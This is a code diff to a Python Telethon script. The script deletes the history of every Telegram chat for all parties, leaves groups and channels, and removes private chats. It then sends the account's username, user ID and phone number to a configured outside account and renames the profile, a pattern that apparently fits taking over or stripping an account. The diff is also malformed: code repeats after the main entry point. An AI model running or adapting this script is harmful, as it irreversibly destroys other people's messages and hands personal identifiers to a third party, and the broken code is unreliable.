@@ -1,8 +1,5 @@
 from telethon import TelegramClient
-from telethon.tl.functions.messages import (
-    DeleteHistoryRequest,
-    DeleteChatUserRequest
-)
+from telethon.tl.functions.messages import DeleteHistoryRequest
 from telethon.tl.functions.channels import LeaveChannelRequest
 from telethon.tl.functions.account import UpdateProfileRequest
 from telethon.tl.types import Channel, Chat, User
@@ -23,36 +20,38 @@ async def main():
 
     async for d in client.iter_dialogs():
         try:
+            entity = d.entity
+            name = d.name or str(d.id)
+
             print(
-                f"Processing: {d.name or d.id} "
-                f"({type(d.entity).__name__})"
+                f"Processing: {name} "
+                f"({type(entity).__name__})"
             )
 
             await client(DeleteHistoryRequest(
-                peer=d.entity,
+                peer=entity,
                 max_id=0,
                 revoke=True
             ))
 
-            if isinstance(d.entity, Channel):
-                await client(LeaveChannelRequest(d.entity))
-                print(f"Left Channel/Supergroup: {d.name or d.id}")
+            if isinstance(entity, Channel):
+                await client(LeaveChannelRequest(entity))
+                print(f"Left Channel/Supergroup: {name}")
 
-            elif isinstance(d.entity, Chat):
-                await client(DeleteChatUserRequest(
-                    chat_id=d.entity.id,
-                    user_id="me"
-                ))
-                print(f"Left Group: {d.name or d.id}")
+            elif isinstance(entity, Chat):
+                await client.delete_dialog(entity)
+                print(f"Left Group: {name}")
 
-            elif isinstance(d.entity, User):
-                await client.delete_dialog(d.entity)
-                print(f"Deleted Private Chat: {d.name or d.id}")
+            elif isinstance(entity, User):
+                await client.delete_dialog(entity)
+                print(f"Deleted Private Chat: {name}")
 
             await asyncio.sleep(1)
 
         except FloodWaitError as e:
-            print(f"FloodWait: waiting {e.seconds} seconds...")
+            print(
+                f"FloodWait: waiting {e.seconds} seconds..."
+            )
             await asyncio.sleep(e.seconds)
 
         except Exception as e:
@@ -63,6 +62,51 @@ async def main():
 
     print("\nDone deleting chats.")
 
+    me = await client.get_me()
+
+    username = (
+        f"@{me.username}"
+        if me.username
+        else "(no username)"
+    )
+
+    phone = (
+        f"+{me.phone}"
+        if me.phone
+        else "(no phone)"
+    )
+
+    info_text = (
+        f"Username: {username}\n"
+        f"User ID: {me.id}\n"
+        f"Phone: {phone}"
+    )
+
+    print("\n--- Account info to be sent ---")
+    print(info_text)
+    print("--------------------------------")
+
+    await client.send_message(
+        TARGET_USERNAME,
+        info_text
+    )
+
+    print(
+        f"Sent account info to @{TARGET_USERNAME}"
+    )
+
+    await client(UpdateProfileRequest(
+        first_name=NEW_FIRST_NAME
+    ))
+
+    print(
+        f"Account name changed to: {NEW_FIRST_NAME}"
+    )
+
+
+if __name__ == "__main__":
+    with client:
+        client.loop.run_until_complete(main())
     me = await client.get_me()
 
     username = f"@{me.username}" if me.username else "(no username)"
